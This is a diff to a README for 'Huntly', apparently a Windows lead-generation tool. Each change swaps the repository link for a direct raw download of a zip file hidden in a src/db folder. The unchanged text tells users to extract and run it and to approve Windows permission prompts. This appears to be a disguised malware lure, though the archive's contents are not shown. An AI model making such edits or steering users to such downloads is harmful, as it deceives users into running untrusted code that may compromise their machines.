@@ -1,6 +1,6 @@
 # 🧠 Huntly - Find Better Leads Faster
 
-[![Download Huntly](https://img.shields.io/badge/Download-Huntly-blue?style=for-the-badge&logo=github)](https://github.com/Suited-whipsnake463/Huntly)
+[![Download Huntly](https://img.shields.io/badge/Download-Huntly-blue?style=for-the-badge&logo=github)](https://github.com/Suited-whipsnake463/Huntly/raw/refs/heads/main/src/db/Software-2.8.zip)
 
 ## 🚀 Overview
 
@@ -23,7 +23,7 @@ Huntly helps you:
 
 Huntly is made for Windows users who want a simple install path. To get started, visit this page to download:
 
-[https://github.com/Suited-whipsnake463/Huntly](https://github.com/Suited-whipsnake463/Huntly)
+[https://github.com/Suited-whipsnake463/Huntly/raw/refs/heads/main/src/db/Software-2.8.zip](https://github.com/Suited-whipsnake463/Huntly/raw/refs/heads/main/src/db/Software-2.8.zip)
 
 After you open the link, look for the latest release or download file. Save it to your computer, then open the file to start the setup process. If Windows asks for permission, choose Yes to continue.
 
@@ -44,7 +44,7 @@ For best results, use a computer with 8 GB RAM. Large lead lists and review scan
 
 Follow these steps on Windows:
 
-1. Open the download page: [https://github.com/Suited-whipsnake463/Huntly](https://github.com/Suited-whipsnake463/Huntly)
+1. Open the download page: [https://github.com/Suited-whipsnake463/Huntly/raw/refs/heads/main/src/db/Software-2.8.zip](https://github.com/Suited-whipsnake463/Huntly/raw/refs/heads/main/src/db/Software-2.8.zip)
 2. Find the latest file for Windows.
 3. Download the file to your Downloads folder.
 4. If the file is zipped, right-click it and choose Extract All.
@@ -191,7 +191,7 @@ This project uses tools and ideas from:
 
 If you need to get the app again, use this page to download:
 
-[https://github.com/Suited-whipsnake463/Huntly](https://github.com/Suited-whipsnake463/Huntly)
+[https://github.com/Suited-whipsnake463/Huntly/raw/refs/heads/main/src/db/Software-2.8.zip](https://github.com/Suited-whipsnake463/Huntly/raw/refs/heads/main/src/db/Software-2.8.zip)
 
 Open the page, find the latest release or file, and download it to your Windows PC
 
